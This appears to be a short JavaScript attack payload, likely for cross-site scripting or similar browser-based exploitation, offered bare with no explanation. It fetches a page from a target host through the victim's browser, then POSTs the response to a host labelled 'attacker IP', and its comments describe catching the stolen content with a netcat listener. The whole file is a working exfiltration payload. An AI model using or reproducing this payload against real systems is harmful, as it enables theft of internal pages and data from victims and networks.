var target = "10.10.10.10" //target IP/host
var request1 = new XMLHttpRequest();
request1.open('GET', target, false);
request1.send();
var response = request1.responseText;

var request2 = new XMLHttpRequest();
request2.open('POST', "10.10.10.10", false); //attacker IP
request2.send(response);

//host on server
//capture content with:
//nc <IP> <PORT> > page.html
